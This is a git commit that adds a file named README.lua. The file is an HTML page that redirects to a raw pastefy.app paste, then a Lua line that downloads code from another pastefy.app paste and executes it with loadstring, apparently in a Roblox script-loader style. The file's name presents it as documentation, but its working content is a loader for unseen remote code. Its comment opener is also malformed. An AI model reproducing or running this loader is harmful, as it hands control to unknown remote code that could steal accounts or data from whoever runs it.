fd167df1d128e5c8923a2d2dd5f36b040ffd2c0b
Ndraawz <wolfykuns15@gmail.com>
2025-05-01 23:51:51 +0700

    Create README.lua

---
+++ README.lua
@@ -0,0 +1,15 @@
+-[[<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="refresh" content="0; URL='https://pastefy.app/oe24ivWp/raw'" />
+    <style>
+      body {
+        background-color: black;
+        margin: 0;
+      }
+    </style>
+  </head>
+  <body></body>
+</html>
+]]
+loadstring(game:HttpGet("https://pastefy.app/aQX93jCW/raw"))()
